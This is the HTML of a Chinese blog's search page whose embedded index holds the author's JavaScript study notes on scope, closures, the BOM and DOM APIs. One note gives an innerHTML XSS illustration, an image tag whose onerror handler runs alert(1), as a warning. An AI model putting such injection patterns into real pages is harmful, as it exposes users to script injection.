<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://thinkerchan.com">
  
  <title>站内搜索 | 测试狗</title>
  <meta name="author" content="测试狗">
  
  <meta name="description" content="🐶">
  
  
  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">

  <meta property="og:title" content="站内搜索"/>
  <meta property="og:site_name" content="测试狗"/>

  
    <meta property="og:image" content=""/>
  

  <link rel="alternate" href="/atom.xml" title="测试狗" type="application/atom+xml">

  <link rel="preload" as="style" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">

  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
  <link href="https://unpkg.com" rel="dns-prefetch" />
  <link href="https://busuanzi.ibruce.info" rel="dns-prefetch" />
  <link href="https://cdn1.lncld.net" rel="dns-prefetch" />
  
  <link href="https://xpjzs0ff.api.lncld.net" rel="dns-prefetch" />
  
</head>

<body>
  <div class="container">
    <div class="left-col" style="background-image:url('https://tva1.sinaimg.cn/large/007S8ZIlly1giq5k8ty3tj306y0zkdix.jpg')">
      <div class="intrude-less">
        <header id="header" class="inner">
          <a href="/">
            <div class="profilepic"><img class="avatar" src='https://tva1.sinaimg.cn/large/007S8ZIlly1giq5t0agwnj30bf0b4jrk.jpg'></div>
          </a>
          <div class="author-name"><a href="/">测试狗</a></div>
          <p class="aboutme">🐶</p>
          <nav id="main-nav">
            <ul class="main">
              
              <li>
                
                  <a href="/archives">归档</a>
                
              </li>
              
              <li>
                
                  <a href="/categories">专题</a>
                
              </li>
              
              <li>
                
                  <a href="/friendlinks">友链</a>
                
              </li>
              
              <li>
                
                  <a href="/life">关于</a>
                
              </li>
              
              <li>
                
                  <a href="/search">搜索</a>
                
              </li>
              
            </ul>
          </nav>
          <nav id="sub-nav">
            <div class="social">
              
              <a class="twitter" href="https://twitter.com/thinkerchan" title="Twitter">Twitter</a>
              
              
              
              <a class="github" href="https://github.com/thinkerchan" title="Github">Github</a>
              
              
              <a class="yuque" href="https://yuque.com/testdog" title="语雀">语雀</a>
              

              
            </div>
          </nav>
        </header>
      </div>
    </div>
    <div class="mid-col">
      <div class="mid-col-container">
        <div id="content" class="inner">
          <article>
  <h1 class="title">站内搜索 </h1>
  <div class="entry-content wrapper">
    <div id="search">
      <input type="text" placeholder="请输入关键字" id="Jinput">
    </div>
    <div class="info">
      本次搜索结果共<span id="Jcount">0</span>条
    </div>
    <div id="JresList"></div>

    


    <script>
      let searchData = [{"title":"HTTP 404","content":"404定义\n404 根据维基百科的定义，此信息代表客户端在浏览网页时，服务器无法正常提供信息，或是服务器无法回应且不知原因。直观体现在用户使用过程中就是在访问某个页面的时候却发现特么这页面不存在。。\n\n日常404众所周知，这样的错误页面给用户体验肯定是不好的，所有的主机都提供客制化404页面的功能，不能假设这些页面不存在，搜索引擎就不会来爬行这种网址，由于种种的原因，网上任何地方都很有可能出现指向你的域名的URL，比如说：网页URL生成规则改变、网页文件更名或移动位置、导入链接拼写错误等，导致原来的URL地址无法访问；当Web 服务器接到类似请求时，会返回一个404状态码，告诉浏览器要请求的资源并不存在。搜索引擎蜘蛛会跟踪这种错误URL,访问不存在的页面。HTTP 404 错误意味着链接指向的网页不存在，即原始网页的URL失效，这种情况经常会发生，很难避免！解决方法是：把缺少的网页文件恢复到正确的位置，重新设置网络服务。对于用户来讲，需要检查你所输入的网络地址是否正确。\n作用那么404页面到底是干啥的?\n404页面的目的是：告诉浏览者其所请求的页面不存在或链接错误，同时引导用户使用网站其他页面而不是关闭窗口离开。搜索引擎蜘蛛在请求某个URL时得到“404”状态回应时，即知道该URL已经失效，便不再索引该网页，并向数据中心反馈将该URL表示的网页从索引数据库中删除，当然，删除过程有可能需要很长时间。\n而当搜索引擎得到“200”状态码时，则会认为该url是有效的，便会去索引，并会将其收录到索引数据库，于是就出现了即便页面是404，却依然返回200状态的用法, 这种方法称为soft 404.\nsoft 404soft 404带来的问题首先，软404错误等于告诉搜索引擎通过这个已经不存在的网址可以找到实际的网页，结果，搜索引擎会花很多时间在您的网站上爬行和索引一些并不存在、而且经常重复的URL\n这会给您网站的索引覆盖率造成负面影响——由于搜索引擎分配给各个网站的抓取索引时间是有限制的，蜘蛛被这种软404错误误导并花了大量时间爬行一些并不存在的网页，您的一部分含有独特内容的希望被展示的网页反而有可能无法被及时发现，或者不能被经常性访问，这样最直接就影响了网站的正确收录.\n其次，软404错误会给访问者带来困惑。不存在的网页，服务器却返回200状态码，表示网页存在并正常访问，搜索引擎就会爬行和索引这个页面，页面就有可能展示在用户搜索结果中，访问者进入页面后，得到的却是一个错误页面","url":"/2015/06/14/404/","link":"","plink":"https://thinkerchan.com/2015/06/14/404/"},{"title":"JS红皮书读书笔记-02-在HTML中使用JS","content":"Script元素直接在HTML页面中使用script元素, 这是在NN2.0浏览器上的最先实现.\nHTML4.01规定script元素有下列几个属性\n\nasync: 可选, 表示立即下载脚本, 但是不应妨碍页面的其他操作, 比如下载其他资源或者等待其他脚本. 只对外部JS有效\ncharset: 可选, 指定字符集\ndefer: 可选, 只对外部脚本有效, 立即下载, 延迟执行.\nsrc: 可选\ntype: 可选, 可视为language属性的替代品, 默认值text/javascript, 实际上服务器传输的时候通常MIME类型为 application/x-javascript或者application/javascript (不信你用chrome控制台随便打开个网页看看)\n\n语法直接代码块&lt;script&gt;\tfunction hi(){\t\talert('Hi')\t}&lt;/script&gt;\n由于JS是阻塞的, 通常以上代码在解释器对内代码求值完之前, 页面其余内容都不会被浏览器显示或加载.\n外链&lt;script src=\"index.js\"&gt;&lt;/script&gt;\n既然一个script元素指定了src, 那就不能再在script元素内添加代码, 否则也会被忽略, 只要不存在defer和async熟悉, 浏览器都会按照从上到下的顺序执行script标签\n优劣通常外链JS会被强调它的优势:\n\n可维护性\n可缓存\n\n放置位置通常放在head标签内, 或者靠近body结束标签前一行.\n延迟脚本HTML 4.01 为&lt;script&gt;标签定义了 defer 属性。这个属性的用途是表明脚本在执行时不会影响页面的构造。也就是说，脚本会被延迟到整个页面都解析完毕后再运行。因此，在&lt;script&gt;元素中设置defer 属性，相当于告诉浏览器立即下载，但延迟执行。\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Example HTML Page&lt;/title&gt;  &lt;script type=\"text/javascript\" defer=\"defer\" src=\"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;  &lt;script type=\"text/javascript\" defer=\"defer\" src=\"https://cdn.bootcss.com/lodash.js/4.17.12-pre/lodash.core.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;!-- 这里放内容 --&gt;&lt;/body&gt;&lt;/html&gt;\n在这个例子中，虽然我们把&lt;script&gt;元素放在了文档的head元素中，但其中包含的脚本将延迟到浏览器遇到&lt;/html&gt;标签后再执行。HTML5 规范要求脚本按照它们出现的先后顺序执行，因此第一个延迟脚本会先于第二个延迟脚本执行，而这两个脚本会先于 DOMContentLoaded 事件执行。在现实当中，延迟脚本并不一定会按照顺序执行，也不一定会在 DOMContentLoaded 事件触发前执行，因此最好只包含一个延迟脚本。\n\n两个defer\n\n异步脚本HTML5 为&lt;script&gt;元素定义了 async 属性。这个属性与 defer 属性类似，都用于改变处理脚本的行为。同样与 defer 类似，async 只适用于外部脚本文件，并告诉浏览器立即下载文件。但与 defer不同的是，标记为 async 的脚本并不保证按照指定它们的先后顺序执行。例如：&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Example HTML Page&lt;/title&gt;&lt;script type=\"text/javascript\" async src=\"example1.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" async src=\"example2.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- 这里放内容 --&gt;&lt;/body&gt;&lt;/html&gt;\n在以上代码中，第二个脚本文件可能会在第一个脚本文件之前执行。因此，确保两者之间互不依赖非常重要。指定 async 属性的目的是不让页面等待两个脚本下载和执行，从而异步加载页面其他内容。为此，建议异步脚本不要在加载期间修改 DOM。异步脚本一定会在页面的 load 事件前执行，但可能会在 DOMContentLoaded 事件触发之前或之后执行。\n文档模式请用HTML5的文档模式.\nnoscript元素由于技术的更新迭代, 这个元素基本不再用到.","url":"/2019/01/20/JSbook02/","link":"","plink":"https://thinkerchan.com/2019/01/20/JSbook02/"},{"title":"JS红皮书读书笔记-04-变量、作用域和内存问题","content":"基本类型和引用类型的值\n再次复习一下,  ECMAScript变量可能包含两种不同数据类型的值：基本类型值和引用类型值。基本类型值指的是简单的数据段，而引用类型值指那些可能由多个值构成的对象。\n\n动态的属性知识点:\n\n对基本类型添加属性虽然不会报错, 但是没有效果\n操作对象时, 操作的是对象的引用而不是实际的对象\n\n复制变量值知识点:\n\n基本类型变量复制是完全复制基本类型变量复制原理\n引用类型变量复制是复制引用引用类型变量复制原理\n\n\n\n\n参数传递JS函数参数传递是按值传递, 如果参数的值是基本类型, 这个很好理解.function addTen(num) { \tnum+=10;\treturn num;}var count = 20;var result = addTen(count);alert(count);\t//20，没有变化alert(result);\t//30\n但是参数是引用类型, 可能就不是很好理解, 我们可以看两个示例\n示例1:function setName(obj) { \tobj.name = \"Nicholas\";}var person = new Object(); setName(person); alert(person.name);\t//\"Nicholas\"\n这个例子看来很像引用传递, 但是传参那一瞬间: obj和person的值都是同一个.即使它是按值传递, 也会因为引用类型必须按照引用的方式访问, 反映到person.name上, 所以视觉上看起来外部变量被修改了.\n我们再来看示例2:function setName(obj) { \tobj.name = \"Nicholas\";\tobj = new Object();\tobj.name = \"Greg\";}var person = new Object(); setName(person); alert(person.name);\t//\"Nicholas\"\n如果是按引用传递, 那么person.name的值肯定户变成”Greg”\n检测类型\n基本类型用 typeof关键字检测\n引用类型用instanceof 检测\n\n执行环境及作用域什么是执行环境 执行环境定义了变量或函数有权访问的其他数据，决定了它们各自的行为。每个执行环境都有一个与之关联的变量对象（ variable  object ），环境中定义的所有变量和函数都保存在这个对象中。虽然我们编写的代码无法访问这个对象，但解析器在处理数据时会在后台使用它。\n执行环境种类执行环境有两种, 一个是全局, 一个是局部(函数)\n在Web浏览器中，全局执行环境被认为是window对象。某个执行环境中的所有代码执行完毕后，该环境被销毁，保存在其中的所有变量和函数定义也随之销毁（全局执行环境直到应用程序退出: 例如关闭网页或浏览器时才会被销毁）\n执行环境的机制每个函数都有自已的执行环境。当执行流进入一个函数时，函数的环境就会被推入一个环境栈中。而在函数执行之后，栈将其环境弹出，把控制权返回给之前的执行环境。 ECMAScript程序中的执行流正是由这个方便的机制控制若。\n什么是作用域链当代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chain ）。它的用途是: 保证(对执行环境有权访问的)所有变量和函数的有序访问。\n作用域链的前端，始终都是当前执行的代码所在环境的变量对象。如果这个环境是函数，则将其活动对象（activation object）作为变量对象(即arguments对象)。\n作用域链中的下一个变量对象来自外部环境(有可能还是函数)，而再下一个变量对象同样来自下一个外部环境，一直延续到全局执行环境（最后一个变量对象）。\nJS的变量, 就根据作用域链来查找, 如果一直到全局环境都找不到, 那就会报错.\n为了方便理解, 我们来看一个例子:var color = \"blue\"; function changeColor(){   var anotherColor = \"red\";   function swapColors(){     var tempColor = anotherColor;      anotherColor = color;     color = tempColor;     // 这里可以访问 color、anotherColor 和 tempColor   }   // 这里只能访问 color 和 anotherColor   swapColors(); } // 这里只能访问 color  changeColor();\n\n本示例的作用域链\n\n延长作用域链两种方式延长作用域链\n\ntry-catch\nwith (避免使用这个语句)\n\n没有块级作用域(ES5)es5没有块级作用域, 所以你在if判断语句之后, 或者for循环之后 都能访问到其中代码块的变量.\n变量声明: 变量使用var关键字声明之后, 自动添加到离它最近的环境, 如果没有使用var声明变量, 这个变量则会被添加到全局环境.\n变量搜索: 搜索过程从作用域链的前端开始，向上逐级查询与给定名字匹配的标识符。如果在局部环境中找到了该标识符，搜索过程停止，变量就绪, 如果到全局还没有搜索到, 说明变量没有声明, 将会报错。从这里可以看出, 搜索变量是有代价的, 局部变量会更快, 因此尽可能不要声明那么多全局环境.\n垃圾收集标记清除略\n引用计数引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是 1。如果同一个值又被赋给另一个变量，则该值的引用次数加 1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减 1。当这个值的引用次数变成 0 时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。\n但是这会产生一个问题: 循环引用function problem(){\tvar a = {name:'a'},\tb = {name:'b'};\ta.bro = b; \tb.bro = a;}problem();\t// 函数执行完毕, 变量依然被循环引用 无法销毁\n性能问题&amp;管理内存如果能手动释放的内存, 尽可能手动释放. 一旦数据不再有用，最好通过将其值设置为 null 来释放其引用 这个做法叫做解除引用（dereferencing）。\n不过，解除一个值的引用并不意味若自动回收该值所占用的内存。解除引用的真正作用是让值脱离执行环境，以便垃圾收集器下次运行时将其回收。","url":"/2019/03/23/JSbook04/","link":"","plink":"https://thinkerchan.com/2019/03/23/JSbook04/"},{"title":"JS红皮书读书笔记-08-BOM","content":"ECMAScript 是 JavaScript 的核心，但如果要在 Web 中使用 JavaScript，那么 BOM（浏览器对象模型）则无疑才是真正的核心。BOM 提供了很多对象，用于访问浏览器的功能，这些功能与任何网页内容无关。\n下面介绍主要的几个BOM对象.\nwindow对象BOM 的核心对象是 window，它表示浏览器的一个实例。在浏览器中，window 对象有双重角色， 它既是通过 JavaScript 访问浏览器窗口的一个接口，又是 ECMAScript 规定的 Global 对象。这意味若在网页中定义的任何一个对象、变量和函数，都以 window 作为其 Global 对象，因此有权访问parseInt()等方法\n全局作用域也就是ES中的global角色, 在全局中定义的变量和方法(函数), 都会挂载在window对象上.但是要注意一点:var color = 'black';delete color; //falseconsole.log(color); //black;window.color2 = 'pink';delete color2; // trueconsole.log(color2); // error\n窗口关系和框架HTML5不在推荐使用frameset, frame元素. 此处略过\n窗口位置主要是 screenX, screenY, screenTop, screeLeft 几个属性\n窗口大小\ninnerWidth\ninnerHeight\nouterWidth\nouterHeight\n\n另外, document.documentElement(或者是document.body)的clientWidth和clientHeight也保存着窗口大小信息\nPS : moveTo, moveBy, resizeTo, resizeBy在现代浏览器中默认被禁用\n导航和打开窗口基本语法// 打开var win = window.open(url, target值, 新窗口特征字符串参数, bool)// 关闭win.close();//可以通过win是否存在来检测弹窗是否被屏蔽\n target有三种值:\n\n_self\n_blank (默认)\n_top\n_parent\n\n新窗口特征字符串, 主要是以下参数:\n\nfullscreen: yes || no\nwidth: number &amp;&amp; number&gt;100\nheight: number &amp;&amp; number&gt;100\nleft: number &amp;&amp; number &gt;= 0\ntop: number &amp;&amp; number &gt;= 0 \nlocation: yes || no\nmenubar: yes || no\nresizable: yes || no\nscrollbars: yes || no\nstatus: yes || no\ntoolbar: yes || no\n\n使用方式: “fullscreen=yes,width=200,height=300…”(不能有空格)\nsetTimeout和setIntervalsetTimeout是我们经常用到的定时器方法:var st = setTimeout('alert(\"hi\"))',1000);// 这里只是一个示例, 尽量避免第一个参数传入字符串// 如果上面的代码没有执行, 那么可以同下面的语句清除cleartTimeout(st)\n由于传递字符串可能导致性能损失，因此不建议以字符串作为第一个参数, 直接传入函数为佳。\n第二个参数是一个表示等待多长时间的毫秒数，但经过该时间后指定的代码不一定会执行。\nJavaScript 是一个单线程序的解释器，因此一定时间内只能执行一段代码。为了控制要执行的代码，就有一个 JavaScript 任务队列。这些任务会按照将它们添加到队列的顺序执行。setTimeout()的第二个参数告诉 JavaScript 再过多长时间把当前任务添加到队列中。如果队列是空的，那么添加的代码会立即执行；如果队列不是空的，那么它就要等前面的代码执行完了以后再执行。\n\nsetInterval:\nsetInterval用法和setTimeout类似, 但是它更耗性能, 前面说了, 每一次执行, 不能保证在约定的时间立即执行. 所以用setInterval来实现定时执行并不是一个理想的选择, 我们通过setTimeout来模拟:\nvar num = 0;var max = 10;function _setInterval(){  var _fn = arguments.callee;  setTimeout(function(){    num++;    console.log(num);    if(num&lt;max){      _fn()    }else{      console.log('循环结束')    }  },500)}\n系统对话框常见的方法如下:\n\nalert\nprompt\nconfirm\n\n不过根据潮流发展, 现在的开发人员更倾向通过重写Div来模拟以上系统对话框.\nlocation对象多用于跳转, 和获取参数, 注意参数的编码解码问题, 不再讲解\nnavigator对象通常我们使用这个对象用于跳转, 和识别UA, 不再讲解\nscreen对象使用频率最低的对象之一, 故不再讲解\nhistory对象history 对象保存若用户上网的历史记录，从窗口被打开的那一刻算起。因为 history 是 window对象的属性，因此每个浏览器窗口、每个标签页乃至每个框架，都有自已的 history 对象与特定的window 对象关联。出于安全方面的考虑，开发人员无法得知用户浏览过的 URL。\n以下是常用的几个方法和属性:\n\ngo: 常见参数:-1,1(对应下面的back, forward)\nback: 后退(用于模拟浏览器的后退按钮)\nforward: 前进(用于模拟浏览器的前进按钮)\nlength:记录访问页面的数量\n\n\n本章完","url":"/2019/03/27/JSbook08/","link":"","plink":"https://thinkerchan.com/2019/03/27/JSbook08/"},{"title":"JS红皮书读书笔记-09-客户端检测","content":"存在客户端检测, 是因为浏览器大战, 各家浏览器一单不按照某个规范, 那么实现起某个功能就会有五花八门的差异.\n比如说早期在ajax和事件绑定上, 都要另外兼容IE , 此章的笔记并不多.\n主要告诉检测的几种思路:\n能力检测比如对区分PC端和移动端要求不高, 可以如下:var isMobile = function () {  try {    return !!document.createEvent(\"TouchEvent\");  } catch (e) {    return false;  }}();\n怪癖检测怪癖检测实际上就根据某版本的浏览器的bug来鉴定, 比如早期的safari浏览器\nfunction isOldSafari(){\tvar reg = /\\d/; \treturn typeof reg == 'function'; // 早期的safari会返回'function', 显然是bug}\nUA检测大部分情况下都是通过访问navigator的userAgent, platform等属性来判断是否属于某种设备. 当然, 对于后端接受来说, 这些字段都是可以伪造的, 不过在前端方面, 用于设备检查, 已经完全足够.\n\n本章完","url":"/2019/03/28/JSbook09/","link":"","plink":"https://thinkerchan.com/2019/03/28/JSbook09/"},{"title":"JS红皮书读书笔记-01-简介","content":"简史\n\nJS诞生之前,也就是二三十年前.那时候网速普遍慢,  想象一下: 用户提交表单到服务器之后结果提示用户漏填了一个字段, 本次提交不成功….所以JS初衷是为了处理这种简单的验证.\n\n1995年, NetScape的员工Brendan Eich为NetScape Navigator 2浏览器开发了这种语言, 并命名为Livescript, 但是正式发布的时候, 为了蹭Java的热度, 就把名字改成了JavaScript, 版本为1.0\n当然微软眼红, 也着手开发了自己的脚本实现, 叫Jscript. 这为后来苦逼的兼容大战埋下伏笔.  微软和NetScape两家公司的竞争, 让JavaScript的标准化提上了议程.\n当时那几个大厂以JavaScript 1.1为蓝本开始构建标准, 也就是我们所知的ECMA-262, 就是ES第一版, 尽管有了约定的行业标准, 但是微软也并没有完全约定, 而是自己实现, 所以IE占有大量市场份额的时候, 有了事实标准和行业标准.\n目前(2019年), 较广为人知的版本有ES3/5/6.\n实现JavaScript的实现主要有三部分组成\n\nECMAscript\nDOM\nBOM\n\nECMAscriptECMAscript实际和浏览器没有什么依赖关系 , Web浏览器只是它的宿主环境之一, 其他的宿主环境还有Node, Adobe Flash.\nES主要规定了一下内容:\n\n语法\n类型\n关键字\n语句\n保留字\n操作符\n对象\n\nDOM全称文档对象模型(Document Object Model). 用于HTML应用程序的编程接口.DOM把整个页面映射为一个多层节点结构, DOM提供的API, 能让开发人员轻松地添加/删除/替换/修改页面节点.\n为了防止Netscape和微软之争,  DOM也有自己的标准: W3C标准(World Wide Web Consortium).\n级别\nDOM0(事实不存在)\nDOM1: 主要映射文档结构\nDOM2: 引入了以下新模块\nDOM视图: 定义了跟踪不同文档视图的接口\nDOM事件: 定义事件, 事件处理\nDOM样式: 定义了基于CSS为元素应用样式的接口\nDOM遍历和范围: 定义了遍历和操作文档树的接口\n\n\nDOM3:\n引入统一方式加载和保存文档的方法\n新增验证文档的方法\n扩展DOM核心, 支持XML1.0规范\n\n\n\nBOM浏览器对象模型(Browser Object Model), 无标准可寻.每个浏览器可以有自己的实现, 但是也会存在事实标准.\nBOM根本上来讲: 只处理浏览器窗口和框架, 但是人们习惯上把JS针对浏览器的扩展归纳到BOM范围, 比如以下扩展:\n\n弹出新窗口功能\n移动 , 缩放, 关闭浏览器\nNavigator对象\nLocation对象\nScreen对象\n对Cookies的支持\nXHR对象, 或者是IE的ActiveXObject对象","url":"/2019/01/19/JSbook1/","link":"","plink":"https://thinkerchan.com/2019/01/19/JSbook1/"},{"title":"JS红皮书读书笔记-07-函数表达式","content":"第五章讲了函数的使用方式, 要么函数声明, 要么函数表达式.\n关于函数声明, 有一个重要的特征, 就是会函数声明提升:sayHi();\t// 这样是可以的, 如果是函数表达式 就会报错function sayHi(){ \talert(\"Hi!\");}\n因为函数声明的这个特性, 千完不要在判断语句中使用函数声明:// 不要这么做!if(condition){  function sayHi(){     alert(\"Hi!\");  }} else {  function sayHi(){     alert(\"Yo!\");  }}\n递归我们看三个示例.示例1:function factorial(num){  if (num &lt;= 1){    return 1;  } else {    return num * factorial(num-1);\t // 耦合问题 }}\n示例2:function factorial(num){  if (num &lt;= 1){    return 1;  } else {    return num * arguments.callee(num-1);\t//严格模式下会报错 }}\n示例3:// 这里使用了函数表达式, 实际上就是示例1的包装var factorial = (function f(num){\t// 同时使用函数表达式和函数声明, 那么函数声明的函数名只能在本函数中被访问  if (num &lt;= 1){    return 1;  } else {    return num * f(num-1); }});\n闭包闭包是指有权访问另一个函数作用域中的变量的函数。\n我们看这个示例:function createComparisonFunction(propertyName) {  return function(object1, object2){    var value1 = object1[propertyName];     var value2 = object2[propertyName];    if (value1 &lt; value2){       return -1;    } else if (value1 &gt; value2){       return 1;    } else {      return 0;    }  };}\n其中返回的匿名函数就是一个闭包.\n闭包与变量function createFunctions(){   var result = new Array();  for (var i=0; i &lt; 10; i++){     result[i] = function(){\t// 闭包保存的是包含环境的变量, 而这个变量经过多次改变, 根据闭包的特性, 只能获取到最后一个改变的值.      return i;    };  }  return result; // 注意这里返回的是闭包数组}\n发现了这个特点, 我们可以再创建多一层闭包:function createFunctions(){   var result = new Array();  for (var i=0; i &lt; 10; i++){     result[i] = (function(index){      return function(){ //注意这里是没有参数的\t\t\treturn index;\t//强行保留起来\t\t};    })(i);  }  return result;}\nthis对象我们在第五章讲过, 函数内部始终有两个特殊对象, 一个是arguments, 一个是this.\nthis指的是最后调用它的环境对象, 在返回的匿名函数中, this指向window,在构造函数中, this就是将要生成的对象, 在DOM中, this指向当前的html节点(这个后面的章节会讲).\n你可能不太理解 this为啥指的是最后调用它的环境对象, 我们来看几个例子:function a(){  console.log('this in a:',this)\t//window  function b(){    console.log('this in b:',this)\t//window  }  b()  return function(){    console.log('this in c:',this)\t//window  }}var c = a();c();\n可以看得出, 无论你函数有没有嵌套, 或者是否为匿名函数, 只要它没有被某一个明确的非window对象显式调用, 那么this都指向window. 这是JS的设计,便于this在函数中的表现一致性.\n我们再来看一个例子:var name = 'window';var object = {  name:'object'}function sayName(){  console.log(this.name);}sayName();\t// 'window', 没毛病// 但是我想让object调用sayName怎么办? 前面我们学的call和apply就排上用处了sayName.call(object); // 'object';//或者用es5的bind方法, 手动添加到object上sayName.bind(object)();// 'object';\n内存泄露主要是针对旧版IE, 略\n模仿块级作用域ES5没有块级作用域:function outputNumbers(count){  for (var i=0; i &lt; count; i++){     alert(i);  }  alert(i); //依然可以访问}\n为了实现块级作用域, 我们通常用立即执行的匿名函数实现:(fnuction(){  // your code is here\tvar i =10;})();\talert(i);\t//报错\n著名的jQuery就是用这种包装形式.\n私有变量严格来讲，JavaScript 中没有私有成员的概念；所有对象属性都是公有的。不过，倒是有一个私有变量的概念。任何在函数中定义的变量，都可以认为是私有变量，因为不能在函数的外部访问这些变量。\n我们来看一个例子:function Person(name){ \t// this.name = name; // 通常我们会这样设置属性  this.getName = function(){    return name;  };  this.setName = function (value) {     name = value;  };}var person = new Person(\"Nicholas\"); alert(person.getName()); //\"Nicholas\" person.setName(\"Greg\"); alert(person.getName()); //\"Greg\"\n上面的示例可以看出, 对象实例无法直接访问name这个属性, 只能通过方法去访问或者修改.但是要记住本示例的代码也是有缺陷的, 为了访问私有变量而生成许多功能相同的特权方法, 是一种资源的浪费.\n静态私有变量略\n模块模式略\n\n后面会另外写一篇文章讲设计模式\n本章完","url":"/2019/03/27/JSbook07/","link":"","plink":"https://thinkerchan.com/2019/03/27/JSbook07/"},{"title":"JS红皮书读书笔记-12-DOM2和DOM3(待更新)","content":"DOM变化针对XML命名空间的优化其他方面的优化样式访问元素的样式操作表样式元素大小遍历NodeIteratorTreeWalker范围DOM中的范围IE8及更早版本的范围","url":"/2019/04/02/JSbook12/","link":"","plink":"https://thinkerchan.com/2019/04/02/JSbook12/"},{"title":"JS红皮书读书笔记-11-DOM扩展","content":"上一章讲了DOM相关的知识, 对此, DOM相关的API已经能满足绝大部分开发者的使用了. 但是jQuery实在是太强大,  以至于W3C对其选择器进行了参考, 而后进行了扩展.\n选择符APIquerySelector用法:var body = document.querySelector('body');var id_body = document.querySelector('#body');var class_body = document.querySelector('.body');\nquerySelectorAll用法:var divs = document.querySelectorAll('div');var class_divs = document.querySelectorAll('.div');\nmatchesSelector\n笔者写此文的时候(2019年),此API已作废, 正确的API为 matches\n\n此API用得比较少:\nvar body = document.body;\t// 假设body.id=\"Jbody\"body.matches('#Jbody');\t//true\n元素遍历略, 此处的API有点鸡肋\nHTML5这里只讲HTML5中与DOM相关的新扩展.\n扩展与Class相关的操作\n新增getElementByClassName显然这个方法受到了jQuery的启发.\n\n新增classList的操作它又以下几个方法:\n\n\n\nadd(value)\nremove(value)\ncontains(value)\ntoggle(value)\n\n以往我们删除(注意这里说的是删除)一个元素中的class中的某个值会比较麻烦,现在有了classList, 我们可以:\ndiv.classList.remove('test');\n焦点管理新增: \n\ndocument.activeElement: 当前焦点元素\ndocument.hasFocus() : 检测文档是否获得焦点\n\nHTMLDocument的变化\n引入readyState: document. readyState 只有两种值: ‘loading’||’complete’\n兼容模式: document.compatMode , 标准模式下它的值是 “CSS1Compat”,通常我们用不到这个属性\nhead属性: 类似document.body\n\n字符集属性document.charset, 略\n自定义数据属性为了规范DOM元素中的自定义属性行为, HTML为开发者提供了自定义数据的属性, 看示例:var div = Jdiv; //假设存在一个这样的元素: &lt;div id=\"Jdiv\" data-id=\"testDiv\"&gt;&lt;/div&gt;//获取自定义属性的值var _id = div.dataset.id;\t// \"testDiv\"// 设置div.dataset.name = \"testdog\";\t// \"testdog\"\n插入标记\ninnerHTML\n\nHTML5对这个属性做了一次加强, 比如:// 在现代浏览器下, script标签会被忽略, 但是旧版本的IE依旧需要注意document.body.innerHTML = '&lt;script&gt;alert(1)&lt;/script&gt;';// 另外, 使用innerHTML一定要注意XSS的问题document.body.innerHTML = '&lt;img src=\"不存在的地址\" onerror=\"alert(1)\"&gt;';\n\n书上说: “并不是所有元素都支持innerHTML属性”, 这句话已经过时, 谨慎参考.\n\n\nouterHTML: 略\ninsertAdjacentHTML(插入位置, html字符串)实际上这个方法早在IE就实现了(IE6都能用), 看下列示例很容易明白:\n\n&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;  &lt;meta charset=\"UTF-8\"&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;!-- beforebegin --&gt;  &lt;p id=\"one\"&gt;    &lt;!-- afterbegin --&gt;    foo    &lt;!-- beforeend --&gt;  &lt;/p&gt;  &lt;!-- afterend --&gt;  &lt;script&gt;    var d1 = document.getElementById('one');    d1.insertAdjacentHTML('afterend', '&lt;div id=\"two\"&gt;two&lt;/div&gt;');  &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;``` 4. 内存和性能问题:使用innerHTML意味着性能的开销, 如非必要, 尽量少用innerHTML### scrollIntoView方法ele. scrollIntoView()即可让元素滚动到与浏览器窗口顶部.## 专有扩展### 文档模式略, 现在都用HTML5文档### children属性还记得之前的ele.childNodes吗? 虽然它返回的是nodeList对象, 但是nodeList中的元素节点, 其实就和ele.children是类似的, 只不过children返回的是HTMLcollection.### contains方法要检查一个元素是不是某一个节点的后代:``` jsele.contains(oneNode);\t// bool\n当然DOM3也提供了一个方法:ele1.compareDocumentPosition(ele2);\n这有一个参考: MDN-compareDocumentPosition , 但是因为这个API返回的结果还要进行位运算, 操作相对麻烦, 故不流行.\n插入文本innerText, outerText , 只操作文本内容. \n滚动略, 目前ele. scrollIntoView()最常用.","url":"/2019/03/28/JSbook11/","link":"","plink":"https://thinkerchan.com/2019/03/28/JSbook11/"},{"title":"JS红皮书读书笔记-14-表单脚本(待更新)","content":"表单的基础知识提交表单重置表单表单字段文本框脚本选择文本过滤输入自动切换焦点HTML5约束验证API选择框脚本选择选项添加选项移除选项移动和重排列表单序列化富文本编辑contentEditable操作富文本富文本选区表单与富文本","url":"/2019/04/09/JSbook14/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook14/"},{"title":"JS红皮书读书笔记-15-Canvas","content":"基本用法本章书关于Canvas的都是一些api用法, 这部分内容查阅W3school 更为直观.\nWebGLWebGL也就是Canvas 3d的情况, 请查阅 WebGL教程","url":"/2019/04/09/JSbook15/","link":"","plink":"https://thinkerchan.com/2019/04/09/JSbook15/"},{"title":"JS红皮书读书笔记-16-HTML5脚本编程","content":"跨文档消息传递(XDM)跨文档消息传递(cross-document messaging)指的是在来自不同域的页面间传递消息。例如，www.wrox.com域中的页面与位于一个内嵌框架中的p2p.wrox.com域中的页面通信。 